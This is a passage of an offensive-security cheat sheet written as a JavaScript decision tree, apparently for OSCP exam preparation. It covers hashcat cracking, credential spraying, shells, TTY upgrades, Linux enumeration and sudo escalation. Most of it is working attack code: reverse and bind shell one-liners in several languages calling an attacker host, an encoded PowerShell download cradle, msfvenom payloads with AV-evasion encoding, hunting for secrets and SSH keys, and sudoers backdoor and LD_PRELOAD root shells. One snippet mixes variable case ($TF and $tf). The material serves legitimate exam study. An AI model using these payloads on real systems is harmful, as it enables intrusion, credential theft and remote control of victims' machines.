# ── STEP 4: BENCHMARK — know your speed ──────────────
hashcat -b   # benchmark all modes on your hardware

# ── STEP 5: CRACK ─────────────────────────────────────
# Basic rockyou
hashcat -m <mode> hash.txt /usr/share/wordlists/rockyou.txt

# With rules — multiply coverage
hashcat -m <mode> hash.txt rockyou.txt \\
  -r /usr/share/hashcat/rules/best64.rule
hashcat -m <mode> hash.txt rockyou.txt \\
  -r /usr/share/hashcat/rules/rockyou-30000.rule   # best for rockyou
hashcat -m <mode> hash.txt rockyou.txt \\
  -r /usr/share/hashcat/rules/d3ad0ne.rule         # broad mutations
hashcat -m <mode> hash.txt rockyou.txt \\
  -r /usr/share/hashcat/rules/dive.rule            # deepest coverage

# KeePass — rockyou-30000.rule was made for this
hashcat -m 13400 keepass.hash rockyou.txt \\
  -r /usr/share/hashcat/rules/rockyou-30000.rule --force

# SSH private key passphrase
hashcat -m 22921 ssh.hash rockyou.txt \\
  -r /usr/share/hashcat/rules/best64.rule --force

# Show cracked result
hashcat -m <mode> hash.txt --show

# John fallback
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
john hash.txt --format=NT --wordlist=rockyou.txt
john hash.txt --show`,
    warn: "rockyou-30000.rule was built specifically for use with rockyou.txt — use it together. bcrypt and sha512crypt are intentionally slow — GPU gives minimal advantage. For those, a targeted wordlist + rules beats a massive wordlist every time.",
    choices: [
      { label: "Cracked — got plaintext", next: "creds_found" },
      { label: "rockyou failed — build better wordlist", next: "custom_wordlist" },
      { label: "Back to password attacks hub", next: "password_attacks" },
    ],
  },


  creds_found: {
    phase: "CREDS",
    title: "Credentials Found",
    body: "Spray those creds on every service immediately. Password reuse is the most consistent win on OSCP. Same user, same password, different service.",
    cmd: `# Try everything
ssh user@$ip
evil-winrm -i $ip -u user -p 'password'
crackmapexec smb $ip -u user -p 'password'
crackmapexec winrm $ip -u user -p 'password'
smbclient //$ip/share -U user
ftp $ip   # try creds manually
mysql -u user -p'password' -h $ip

# Check all share access with creds
crackmapexec smb $ip -u user -p 'password' --shares
crackmapexec smb $ip -u user -p 'password' --users
crackmapexec smb $ip -u user -p 'password' --groups

# ── RUNAS — open PS as another user (Windows, requires GUI) ──
# Basic runas — opens cmd window as target user
runas /user:HOSTNAME\targetuser cmd

# Open PowerShell as target user
runas /user:HOSTNAME\targetuser powershell

# With saved credentials (if cmdkey has them stored)
runas /savecred /user:HOSTNAME\targetuser powershell

# Domain user
runas /user:DOMAIN\targetuser powershell

# No GUI? Use PowerShell credential object instead:
# (works in bind shell / WinRM)
# pw = ConvertTo-SecureString "FOUND_PASSWORD" -AsPlainText -Force
# cred = New-Object PSCredential("HOSTNAME/targetuser", pw)
# Start-Process powershell -Credential cred

# Then in the new window — verify you are the new user:
whoami
whoami /groups
whoami /priv

# Re-enumerate as new user — permissions change!
# Run full enum again — files readable by dave may not be
# readable by steve and vice versa (Module 17.1.3 pattern)`,
    warn: null,
    choices: [
      { label: "SSH / shell access — Linux machine", next: "linux_post_exploit" },
      { label: "WinRM / RDP / SMB — Windows machine", next: "windows_post_exploit" },
      { label: "Web access only", next: "file_upload" },
      { label: "Spray these creds everywhere NOW", next: "cred_reuse" },
    ],
  },

  // ==========================================
  //  SHELL & UPGRADE
  // ==========================================
  reverse_shell: {
    phase: "SHELL",
    title: "Catch the Shell",
    body: "Listener first, then execute payload. Use 443 or 80 — egress filtering blocks high ports constantly. pwncat-cs auto-upgrades TTY. If the shell dies immediately, the issue is almost always the payload encoding or a filtered port.",
    cmd: `# -- LISTENERS ----------------------------
# pwncat-cs (best — auto TTY, file transfer built in)
pwncat-cs -lp $lport

# nc fallback
nc -nlvp $lport

# -- LINUX PAYLOADS ------------------------
# Bash (most reliable on Linux)
bash -i >& /dev/tcp/$lhost/$lport 0>&1
# URL encoded version (for web shells/curl):
bash+-c+'bash+-i+>%26+/dev/tcp/$lhost/$lport+0>%261'

# Python3
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("$lhost",$lport));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# Python2 fallback
python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("$lhost",$lport));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# PHP (web context)
php -r '$sock=fsockopen("$lhost",$lport);exec("/bin/sh -i <&3 >&3 2>&3");'

# Perl
perl -e 'use Socket;$i="$lhost";$p=$lport;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");'

# nc with -e (if available)
nc $lhost $lport -e /bin/bash

# -- WINDOWS PAYLOADS ---------------------
# PowerShell one-liner
powershell -nop -w hidden -c "$c=New-Object Net.Sockets.TCPClient('$lhost',$lport);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$sb2=$sb+'PS '+(pwd).Path+'> ';$sb3=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sb3,0,$sb3.Length);$s.Flush()};$c.Close()"

# PowerShell encoded (bypass execution policy + logging)
# Generate: echo "IEX(New-Object Net.WebClient).DownloadString('http://$lhost/shell.ps1')" | iconv -t UTF-16LE | base64 -w0
powershell -nop -w hidden -enc [BASE64]

# msfvenom Windows stageless exe
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$lhost LPORT=$lport -f exe -o shell.exe
# Staged (smaller, needs handler)
msfvenom -p windows/x64/shell/reverse_tcp LHOST=$lhost LPORT=$lport -f exe -o staged.exe

# msfvenom Linux ELF
msfvenom -p linux/x64/shell_reverse_tcp LHOST=$lhost LPORT=$lport -f elf -o shell.elf

# Reference: https://www.revshells.com`,
    warn: "Shell dies immediately? Check: (1) port reachable from target — try 443/80, (2) AV killing binary — use encoded payload or AMSI bypass, (3) bash not available — try sh or python, (4) /bin/bash path wrong — try /bin/sh.",
    choices: [
      { label: "Shell caught — upgrade TTY", next: "shell_upgrade" },
      { label: "Shell dies immediately — troubleshoot", next: "shell_troubleshoot" },
      { label: "AV killing binary — bypass needed", next: "amsi_bypass" },
      { label: "Need meterpreter instead", next: "shell_meterpreter" },
    ],
  },

  shell_troubleshoot: {
    phase: "SHELL",
    title: "Shell Troubleshooting",
    body: "Shell not catching or dying immediately. Work through this systematically — the failure mode is almost always one of five things.",
    cmd: `# -- BIND SHELL VS REVERSE SHELL ──────────
# Reverse shell: target connects BACK to you (nc -nlvp PORT on Kali)
# Bind shell:    target LISTENS, you connect TO it (nc $ip PORT)
# Some exploits (e.g. CVE-2007-4560 clamav-milter) open bind shells
# If exploit fires but nothing hits your listener — try nc $ip <port>
# Lab: ClamAV — exploit opened port 31337 on target, no listener needed

# -- SCRIPT INTERPRETER ISSUES ─────────────
# No shebang line = bash tries to run it = silent failure
# perl scripts: always call  perl script.pl  not  ./script.pl
# python scripts: python3 script.py
# ruby scripts: ruby script.rb
# Old boxes may not have python3 — try python for PTY upgrade

# -- DIAGNOSTIC CHECKLIST -----------------

# 1. CAN THE TARGET REACH YOU?
# On target:
ping $lhost -c 1       # ICMP allowed?
curl http://$lhost      # HTTP out allowed?
# On attacker — watch tcpdump:
sudo tcpdump -i tun0 icmp
sudo tcpdump -i tun0 port $lport
# No ping = strict egress — try ports 80, 443, 53

# 2. WRONG PORT — FIREWALL FILTERING
# Retry with common allowed egress ports:
export lport=443   # HTTPS — almost never blocked
export lport=80    # HTTP
export lport=53    # DNS (use for tunnel not reverse shell normally)
nc -nlvp 443

# 3. SHELL BINARY NOT AVAILABLE
# Test what's on the target:
which bash sh python python3 perl ruby nc ncat
# Use whatever is present in the payload

# 4. ENCODING ISSUE (web delivery)
# Spaces and special chars break bash -c in web context
# Use base64 brace expansion — no spaces, no special chars:
echo 'bash -i >& /dev/tcp/$lhost/$lport 0>&1' | base64 -w0
# Take the output (B64) and deliver as:
bash -c '{echo,B64OUTPUT}|{base64,-d}|{bash,-i}'

# PowerShell must use UTF-16LE encoding (not UTF-8):
echo 'IEX(New-Object Net.WebClient).DownloadString("http://$lhost/shell.ps1")' | iconv -t UTF-16LE | base64 -w0
powershell -nop -w hidden -enc B64OUTPUT

# Quick test — does base64 decode correctly?
echo "B64OUTPUT" | base64 -d  # verify payload before delivery

# 5. AV/AMSI BLOCKING BINARY
# Switch to: encoded PS, msfvenom with encoding, or manual AMSI bypass
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$lhost LPORT=443 \
  -f exe -e x64/xor_dynamic -i 5 -o shell_enc.exe

# 6. INTERACTIVE SHELL NEEDED (su, ssh)
# Some exploits give non-interactive — upgrade immediately
script /dev/null -c bash
python3 -c 'import pty; pty.spawn("/bin/bash")'`,
    warn: "tcpdump is your ground truth. Run it on tun0 BEFORE executing payload. If you see the connection hit your interface but nc catches nothing: wrong port on listener. If nothing hits interface at all: egress filtered or wrong LHOST.",
    choices: [
      { label: "Fixed — shell caught", next: "shell_upgrade" },
      { label: "AV issue — bypass", next: "amsi_bypass" },
      { label: "Port filtered — try bind shell", next: "shell_bind" },
      { label: "Need different approach", next: "reverse_shell" },
    ],
  },

  shell_bind: {
    phase: "SHELL",
    title: "Bind Shell — Outbound Blocked",
    body: "Reverse shell requires outbound from target. If egress is fully filtered, flip it — bind shell listens ON the target, you connect TO it. Requires inbound access to target port.",
    cmd: `# -- BIND SHELL PAYLOADS ------------------
# nc on target (if -e available)
nc -nlvp 4444 -e /bin/bash

# nc without -e (use mkfifo)
mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc -nlvp 4444 > /tmp/f

# Python3 bind
python3 -c 'import socket,subprocess,os;s=socket.socket();s.bind(("0.0.0.0",4444));s.listen(1);c,a=s.accept();os.dup2(c.fileno(),0);os.dup2(c.fileno(),1);os.dup2(c.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# PowerShell bind (Windows)
powershell -nop -w hidden -c "$l=New-Object Net.Sockets.TcpListener('0.0.0.0',4444);$l.start();$c=$l.AcceptTcpClient();$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$sb2=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sb2,0,$sb2.Length);$s.Flush()};$c.Close();$l.Stop()"

# msfvenom bind (Linux)
msfvenom -p linux/x64/shell_bind_tcp LPORT=4444 -f elf -o bind.elf

# msfvenom bind (Windows)
msfvenom -p windows/x64/shell_bind_tcp LPORT=4444 -f exe -o bind.exe

# -- CONNECT FROM ATTACKER -----------------
nc $ip 4444`,
    warn: "Bind shells on OSCP exam machines are risky — another candidate could connect to your bind shell. Use a non-obvious port and close it when done. Reverse shells are always preferred.",
    choices: [
      { label: "Bind shell connected — upgrade TTY", next: "shell_upgrade" },
      { label: "Port blocked inbound too — web shell only", next: "iis_aspx" },
    ],
  },

  shell_meterpreter: {
    phase: "SHELL",
    title: "Meterpreter Shell",
    body: "Meterpreter is allowed on OSCP for 3 of 5 machines. Staged payload needs a handler. Stageless is simpler. Know the difference and know when to use each.",
    cmd: `# -- STAGED vs STAGELESS ------------------
# Staged (windows/x64/meterpreter/reverse_tcp):
#   Small stager connects back → downloads full payload
#   Needs: multi/handler running before execution
#   Smaller file, better for size-limited delivery

# Stageless (windows/x64/meterpreter_reverse_tcp):
#   Full payload in one binary
#   No handler dependency — nc won't work, need handler
#   Better AV detection but simpler setup

# -- GENERATE PAYLOAD ---------------------
# Staged Windows x64
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=$lhost LPORT=$lport -f exe -o met_staged.exe

# Stageless Windows x64
msfvenom -p windows/x64/meterpreter_reverse_tcp \
  LHOST=$lhost LPORT=$lport -f exe -o met_stageless.exe

# Linux staged
msfvenom -p linux/x64/meterpreter/reverse_tcp \
  LHOST=$lhost LPORT=$lport -f elf -o met_linux.elf

# -- HANDLER ------------------------------
msfconsole -q
use multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST $lhost
set LPORT $lport
set ExitOnSession false
run -j   # run as job, catches multiple sessions

# -- USEFUL METERPRETER COMMANDS ----------
sysinfo          # OS info
getuid           # current user
getsystem        # attempt privilege escalation
hashdump         # dump SAM hashes (needs SYSTEM)
upload shell.exe C:\\Windows\\Temp\\shell.exe
download C:\\Users\\Administrator\\Desktop\\proof.txt
shell            # drop to cmd.exe
migrate [PID]    # migrate to stable process
run post/multi/recon/local_exploit_suggester`,
    warn: "OSCP limits meterpreter to 3 of 5 exam machines. Use it strategically — not as your default. The exam tests whether you can operate without it. Save it for machines where it provides clear value.",
    choices: [
      { label: "Meterpreter session — post-exploit", next: "windows_post_exploit" },
      { label: "Meterpreter on Linux", next: "linux_post_exploit" },
      { label: "AV killed it — bypass first", next: "amsi_bypass" },
    ],
  },

  shell_upgrade: {
    phase: "SHELL",
    title: "Upgrade to Full TTY",
    body: "Do this immediately every time you get a shell. A dumb shell kills your process on Ctrl+C, breaks tab completion, and makes vim unusable. The python + Ctrl+Z trick is the standard.",
    cmd: `# ── STEP 1: SPAWN A PTY ──────────────────────────────
# Python3 (most common)
python3 -c 'import pty; pty.spawn("/bin/bash")'

# Python2 fallback
python -c 'import pty; pty.spawn("/bin/bash")'

# script fallback (if no python)
/usr/bin/script -qc /bin/bash /dev/null
script /dev/null -c bash

# socat (best — fully interactive, no extra steps needed)
# Attacker:
socat file:\`tty\`,raw,echo=0 tcp-listen:4444
# Target:
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:$lhost:4444

# ── STEP 2: CTRL+Z TRICK ─────────────────────────────
# After spawning PTY — background the shell
# Press: Ctrl+Z
# (shell goes to background, you're back on Kali)

# ── STEP 3: FIX YOUR TERMINAL ────────────────────────
stty raw -echo; fg
# stty raw    = pass keystrokes directly (Ctrl+C works now)
# -echo       = stop Kali echoing what you type
# fg          = bring shell back to foreground
# (you may need to press Enter once after fg)

# ── STEP 4: FIX TERMINAL SIZE AND ENVIRONMENT ─────────
export TERM=xterm-256color
export SHELL=/bin/bash

# Check your current terminal size on Kali first:
# stty size   (on Kali — shows rows cols)
stty rows 38 columns 200
# Set to match your actual terminal dimensions

# ── STEP 5: OPTIONAL CLEANUP ──────────────────────────
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
alias ls='ls -arlht --color=auto'
reset   # if display is garbled after Ctrl+Z

# ── IF PYTHON NOT AVAILABLE ──────────────────────────
which python python3 perl ruby php 2>/dev/null
# perl
perl -e 'exec "/bin/bash";'
# ruby
ruby -e 'exec "/bin/bash"'
# awk
awk 'BEGIN {system("/bin/bash")}'
# find
find / -name / -exec /bin/bash \;

# ── CHECK WHAT SHELL YOU HAVE ─────────────────────────
echo $0
echo $SHELL
cat /etc/shells
which bash sh zsh

# ── RLWRAP (for nc shells on Kali — before upgrade) ───
# On Kali, wrap nc with rlwrap for arrow keys + history
rlwrap nc -nlvp $lport`,
    warn: "After stty raw -echo if something goes wrong and your terminal is broken — type 'reset' blindly and hit Enter. It will restore your terminal even if you can't see what you're typing.",
    choices: [
      { label: "Linux shell — start privesc", next: "linux_post_exploit" },
      { label: "Windows shell — start privesc", next: "windows_post_exploit" },
      { label: "Shell keeps dying — troubleshoot", next: "shell_troubleshoot" },
    ],
  },

  // ==========================================
  //  LINUX PRIVESC
  // ==========================================
  linux_post_exploit: {
    phase: "LINUX",
    title: "Linux Post-Exploit — Full Enum Flow",
    body: "Automated tools first, manual while they run. Every new user = start from Step 1. Information gathering is cyclical.",
    cmd: `# ── STEP 1: WHO AM I — INSTANT CONTEXT ──────────────
id
whoami
hostname
id | grep -i "sudo\|admin\|wheel\|docker\|lxd\|disk\|adm\|staff"
# docker/lxd = instant root → linux_privesc_extra
# sudo group  = sudo -l immediately

# ── STEP 2: LAUNCH AUTOMATED TOOLS IN BACKGROUND ─────
# Start these first — they run while you do manual enum
# LinPEAS
wget http://$lhost/linpeas.sh -O /tmp/lp.sh && chmod +x /tmp/lp.sh
/tmp/lp.sh | tee /tmp/linpeas_out.txt &
# or in memory: curl http://$lhost/linpeas.sh | bash

# LinEnum — scripted local Linux enumeration
# github.com/rebootuser/LinEnum
wget http://$lhost/LinEnum.sh -O /tmp/le.sh && chmod +x /tmp/le.sh
/tmp/le.sh -t | tee /tmp/linenum_out.txt &
# -t = thorough mode — slower but more checks
# Good complement to LinPEAS — catches different things

# unix-privesc-check
./unix-privesc-check standard 2>/dev/null | tee /tmp/upc_out.txt &

# pspy (watch for cron processes without root)
/tmp/pspy64 > /tmp/pspy_out.txt &

# ── STEP 3: OS AND KERNEL ────────────────────────────
uname -a
cat /etc/issue
cat /etc/os-release
cat /proc/version
arch

# ── STEP 4: ALL USERS ────────────────────────────────
cat /etc/passwd
cat /etc/passwd | grep -v nologin | grep -v false
# UID 0 = root, UID 1000+ = real users
# nologin/false = service accounts — skip them
grep -v -E "^#" /etc/passwd | awk -F: '$3 == 0 { print $1 }'   # all UID 0 users

# ── STEP 5: SUDO ─────────────────────────────────────
sudo -l
# → go to sudo_check if anything shows

# ── STEP 6: SUID / CAPABILITIES ──────────────────────
find / -perm -u=s -type f 2>/dev/null
getcap -r / 2>/dev/null
# → go to suid_check, cross-ref GTFOBins

# ── STEP 7: NETWORK ──────────────────────────────────
ip a
# Two NICs = pivot opportunity
ip route
netstat -anp 2>/dev/null || ss -anp
ss -anp | grep "127.0.0.1"   # internal services
arp -a
cat /etc/hosts

# ── STEP 8: RUNNING PROCESSES ────────────────────────
ps aux
ps aux | grep root
# Watch for cleartext creds in args:
watch -n 1 "ps aux | grep pass"

# ── STEP 9: CRON JOBS ─────────────────────────────────
cat /etc/crontab
ls -la /etc/cron*
crontab -l
sudo crontab -l 2>/dev/null
grep "CRON" /var/log/syslog | tail -20
cat /var/spool/cron/crontabs/* 2>/dev/null
# → go to cron_check if writable script found

# ── STEP 10: INSTALLED PACKAGES ──────────────────────
dpkg -l 2>/dev/null | grep "^ii"
rpm -qa 2>/dev/null
ls -la /usr/bin/ /usr/sbin/ /opt/ /srv/ 2>/dev/null

# ── STEP 11: FILE HUNTING ────────────────────────────
# Do this EARLY — custom configs contain creds automated tools miss
# User home directories
find /home -name "*.txt" -o -name "*.conf" -o -name "*.ini" -o -name "*.bak" 2>/dev/null
ls -la /home/*/
cat /home/*/.bash_history 2>/dev/null

# App configs — based on what's installed
find /var/www /opt /srv -name "*.php" -o -name "*.conf" -o -name "*.env" -o -name "config.yml" 2>/dev/null | xargs grep -il "pass" 2>/dev/null
cat /var/www/html/wp-config.php 2>/dev/null
find / -name ".env" 2>/dev/null | xargs cat 2>/dev/null

# SSH keys
find / -name "id_rsa" -o -name "id_ecdsa" -o -name "id_ed25519" 2>/dev/null

# KeePass
find / -name "*.kdbx" 2>/dev/null

# ── STEP 12: BASH HISTORY AND ENV ────────────────────
cat ~/.bash_history
cat ~/.bashrc | grep export
cat ~/.nano_history ~/.mysql_history ~/.atftp_history 2>/dev/null
env | grep -i "pass\|key\|secret\|token\|api\|db\|cred"
cat /proc/*/environ 2>/dev/null | tr '\0' '\n' | grep -i pass

# ── STEP 13: FIREWALL / IPTABLES ─────────────────────
cat /etc/iptables/rules.v4 2>/dev/null
iptables -L 2>/dev/null
# Non-standard ports in iptables = internal services worth probing

# ── STEP 14: DRIVES AND MOUNTS ───────────────────────
cat /etc/fstab
mount
lsblk
# Unmounted partitions = may contain creds/data

# ── /PROC FILESYSTEM — PROCESS INSPECTION ───────────
# Kernel exposes all processes under /proc
# Run process in background to get PID:
sleep 1000 &   # → [1] 118168
ls /proc/118168              # everything kernel knows about it
cat /proc/118168/cmdline     # exact command + args
grep -i uid /proc/118168/status
# Uid: 1000 1000 1000 1000 = real/effective/saved/fs UID
# If effective UID (col 2) = 0 = running as root

# ── STEP 15: KERNEL MODULES ──────────────────────────
lsmod
/sbin/modinfo <module>   # get version info for exploit matching

# ── STEP 16: COMPILERS AVAILABLE ─────────────────────
which gcc g++ cc python python3 perl ruby 2>/dev/null
# gcc present = can compile kernel exploits on target

# ── STEP 17: WRITABLE DIRECTORIES ────────────────────
find / -writable -type d 2>/dev/null | grep -v proc | grep -v sys | grep -v run
find / -writable -type f 2>/dev/null | grep -v proc | grep -v sys | grep -v run | grep -v "/dev/"
ls -la /etc/passwd /etc/shadow /etc/sudoers /etc/crontab
# -rw-rw-rw- on /etc/passwd = instant root → passwd_shadow

# ── STEP 18: GRAB FLAGS ───────────────────────────────
find / -name local.txt 2>/dev/null | xargs cat 2>/dev/null
find / -name proof.txt 2>/dev/null | xargs cat 2>/dev/null
cat /root/proof.txt 2>/dev/null

# ── NOTE: ENUMERATION IS CYCLICAL ────────────────────
# Every new user = start over from Step 1
# New user = new sudo perms, new files readable, new history
# Lab pattern: env var cred → su root OR crunch+hydra on other users → sudo -l`,
    warn: "Launch LinPEAS in the background at Step 2 — don't wait for it to finish before doing manual enum. The thing that gets you root is usually NOT in the automated output.",
    choices: [
      { label: "Quick one-liner reference", next: "linux_enum_quick" },
      { label: "Interesting sudo — check it", next: "sudo_check" },
      { label: "Run LinPEAS now", next: "linpeas" },
      { label: "SUID binary found", next: "suid_check" },
      { label: "Cron job found", next: "cron_check" },
      { label: "Creds in env/history/files", next: "linux_password_hunt" },
      { label: "/etc/passwd writable", next: "passwd_shadow" },
      { label: "Interesting group (docker/lxd/disk)", next: "linux_privesc_extra" },
      { label: "Kernel exploit path", next: "kernel_exploit" },
    ],
  },



  linux_enum_quick: {
    phase: "LINUX",
    title: "Linux Enum — Quick Reference",
    body: "One-liners only. No explanations. Run top to bottom on a new foothold. Full detail in linux_post_exploit.",
    cmd: `# ── IDENTITY ─────────────────────────────────────────
id
whoami
id | grep -i "sudo\|docker\|lxd\|disk\|adm\|wheel"
cat /etc/passwd | grep -v nologin | grep -v false
grep -v -E "^#" /etc/passwd | awk -F: '$3 == 0 { print $1 }'   # UID 0 users

# ── OS / KERNEL ──────────────────────────────────────
uname -a
cat /etc/issue
cat /etc/os-release | head -5

# ── SUDO ─────────────────────────────────────────────
sudo -l

# ── SUID ─────────────────────────────────────────────
find / -perm -u=s -type f 2>/dev/null
getcap -r / 2>/dev/null

# ── NETWORK ──────────────────────────────────────────
ip a
ip route
ss -anp | grep LISTEN
ss -anp | grep "127.0.0.1"
arp -a

# ── PROCESSES ────────────────────────────────────────
ps aux | grep root
watch -n 1 "ps aux | grep pass"

# ── CRON ─────────────────────────────────────────────
cat /etc/crontab
ls -la /etc/cron*
cat /var/spool/cron/crontabs/* 2>/dev/null
grep "CRON" /var/log/syslog | tail -20

# ── WRITABLE / INTERESTING ───────────────────────────
find / -writable -type f 2>/dev/null | grep -v proc | grep -v sys | grep -v run
find / -writable -type d 2>/dev/null | grep -v proc | grep -v sys
ls -la /etc/passwd /etc/shadow /etc/sudoers /etc/crontab

# ── HISTORY / ENV ────────────────────────────────────
cat ~/.bash_history
cat ~/.bashrc | grep export
env | grep -i "pass\|key\|secret\|token"
cat ~/.nano_history ~/.mysql_history ~/.atftp_history 2>/dev/null

# ── SERVICES / PACKAGES ──────────────────────────────
ps aux | grep -v "\[" | awk '{print $11}' | sort -u
dpkg -l 2>/dev/null | grep -i "^ii" | awk '{print $2,$3}'
rpm -qa 2>/dev/null

# ── FILE HUNTING ─────────────────────────────────────
find / -name "*.conf" -o -name "*.config" -o -name ".env" 2>/dev/null | xargs grep -il "pass" 2>/dev/null
find / -name "id_rsa" -o -name "*.kdbx" -o -name "wp-config.php" 2>/dev/null
ls -la /var/www/html/ /opt/ /srv/ 2>/dev/null
cat /var/log/auth.log 2>/dev/null | grep -i "pass\|fail" | tail -20

# ── /ETC/PASSWD WRITABLE? ────────────────────────────
ls -la /etc/passwd
# -rw-rw-rw- = instant root

# ── COMPILERS AVAILABLE? ─────────────────────────────
which gcc g++ python python3 perl ruby 2>/dev/null`,
    warn: null,
    choices: [
      { label: "sudo -l shows something", next: "sudo_check" },
      { label: "SUID binary found", next: "suid_check" },
      { label: "Cron job found", next: "cron_check" },
      { label: "Creds in env/history", next: "linux_password_hunt" },
      { label: "Interesting group membership", next: "linux_privesc_extra" },
      { label: "Run LinPEAS", next: "linpeas" },
      { label: "Kernel exploit path", next: "kernel_exploit" },
    ],
  },

  linpeas: {
    phase: "LINUX",
    title: "LinPEAS + Automated Linux Enum",
    body: "Module 18.1.3: run automated tools first for speed, but they miss custom configs. Always supplement with manual enum. LinPEAS color codes: RED = high priority, YELLOW = interesting.",
    cmd: `# ── LINPEAS ───────────────────────────────────────────
# On Kali:
# cp /usr/share/peass/linpeas/linpeas.sh .
# python3 -m http.server 80

# Transfer and run (save output)
wget http://$lhost/linpeas.sh -O /tmp/lp.sh
chmod +x /tmp/lp.sh
/tmp/lp.sh | tee /tmp/linpeas_out.txt

# Or run in memory (no disk touch)
curl http://$lhost/linpeas.sh | bash

# If /tmp is noexec:
cd /dev/shm && wget http://$lhost/linpeas.sh -O lp.sh && chmod +x lp.sh && ./lp.sh

# Exfil output to Kali
# impacket-smbserver -smb2support kali . -username user -password pass
# On target:
# mount.cifs //$lhost/kali /mnt -o username=user,password=pass
# cp /tmp/linpeas_out.txt /mnt/

# ── LINENUM ───────────────────────────────────────────
wget http://$lhost/LinEnum.sh -O /tmp/le.sh
chmod +x /tmp/le.sh && /tmp/le.sh

# ── UNIX-PRIVESC-CHECK (pre-installed on Kali) ────────
# Already on Kali: /usr/bin/unix-privesc-check
# Transfer to target:
scp /usr/bin/unix-privesc-check user@$ip:/tmp/
./unix-privesc-check standard > /tmp/output.txt
./unix-privesc-check detailed > /tmp/output_detailed.txt
cat /tmp/output.txt | grep -i "WARNING"

# ── PSPY — WATCH PROCESSES WITHOUT ROOT ───────────────
# Download: github.com/DominicBreuker/pspy
wget http://$lhost/pspy64 -O /tmp/pspy64
chmod +x /tmp/pspy64
/tmp/pspy64
# Watch for cron jobs running as root (UID=0)
# Ctrl+C to stop

# ── LINPEAS COLOR GUIDE ───────────────────────────────
# RED/YELLOW  = 95%+ chance of privesc vector
# GREEN       = good for the attacker (interesting config)
# Focus areas in order:
# 1. Sudo version + CVEs
# 2. SUID binaries
# 3. Cron jobs
# 4. Writable files owned by root
# 5. Services running as root
# 6. Password files / history
# 7. Network services on loopback`,
    warn: "LinPEAS misses custom one-off configs — the thing that gets you root is often not in the automated output. Always check bash history, env vars, and cron scripts manually.",
    choices: [
      { label: "Sudo misconfiguration found", next: "sudo_check" },
      { label: "SUID binary found", next: "suid_check" },
      { label: "Cron job writable", next: "cron_check" },
      { label: "Creds in history/env", next: "linux_password_hunt" },
      { label: "Kernel exploit path", next: "kernel_exploit" },
      { label: "Interesting group (docker/lxd/disk)", next: "linux_privesc_extra" },
    ],
  },


  sudo_check: {
    phase: "LINUX",
    title: "Sudo Exploitation",
    body: "Module 18.4.2: sudo -l shows what you can run as root. Cross-ref with GTFOBins. Watch for AppArmor blocking — check /var/log/syslog if exploit fails.",
    cmd: `# ── CHECK SUDO PERMISSIONS ───────────────────────────
sudo -l
# Key patterns:
# (ALL : ALL) ALL              = full root — sudo -i or sudo su
# (ALL) NOPASSWD: /usr/bin/vim = run vim as root no password
# (root) /usr/bin/apt-get      = specific command

# ── FULL SUDO — INSTANT ROOT ──────────────────────────
sudo -i
sudo su
sudo /bin/bash
sudo -s

# ── COMMON GTFOBINS SUDO ONE-LINERS ──────────────────
# vim
sudo vim -c ':!/bin/bash'
sudo vim -c ':py import os; os.system("/bin/bash")'

# nano
sudo nano
# Inside nano: Ctrl+R Ctrl+X then: reset; sh 1>&0 2>&0

# find
sudo find . -exec /bin/sh \; -quit

# python3
sudo python3 -c 'import os; os.system("/bin/bash")'

# less
sudo less /etc/passwd
# Inside less: !/bin/bash

# awk
sudo awk 'BEGIN {system("/bin/bash")}'

# apt-get (Module 18.4.2 example)
sudo apt-get changelog apt
# Inside less/pager: !/bin/sh

# tcpdump (Module 18.4.2 — may be blocked by AppArmor)
COMMAND='id'
TF=$(mktemp)
echo "$COMMAND" > $tf
chmod +x $tf
sudo tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $tf -Z root

# env
sudo env /bin/bash

# tee — write to root files
echo "user ALL=(ALL) NOPASSWD: ALL" | sudo tee -a /etc/sudoers

# ── APPARMOR — IF EXPLOIT BLOCKED ────────────────────
# Module 18.4.2: AppArmor can block sudo exploits
cat /var/log/syslog | grep "DENIED"
# apparmor="DENIED" = AppArmor blocked it
# Check status:
sudo aa-status 2>/dev/null

# ── SUDO WITH ENV VARS ────────────────────────────────
# If env_keep is set (LD_PRELOAD etc)
sudo -l | grep env_keep
# LD_PRELOAD trick:
# cat > /tmp/pe.c << EOF
# #include <stdio.h>
# #include <stdlib.h>
# void _init() { setuid(0); system("/bin/bash"); }
# EOF
gcc -shared -fPIC -nostartfiles -o /tmp/pe.so /tmp/pe.c
sudo LD_PRELOAD=/tmp/pe.so <allowed_command>

# ── GCC (sudo) ────────────────────────────────────────
# sudo -l shows: /usr/bin/gcc
sudo gcc -wrapper /bin/bash,-s -o /dev/null /dev/null
# instant root shell

# Alternative — compile setuid shell:
echo 'int main(){setuid(0);setgid(0);system("/bin/bash");}' > /tmp/sh.c
sudo gcc /tmp/sh.c -o /tmp/sh
/tmp/sh

# ── SUDO VERSION EXPLOIT ──────────────────────────────
# Baron Samedit CVE-2021-3156 (sudo < 1.9.5p2)
sudo --version
sudoedit -s / 2>&1 | grep -i "usage"
# If "usage" = vulnerable`,
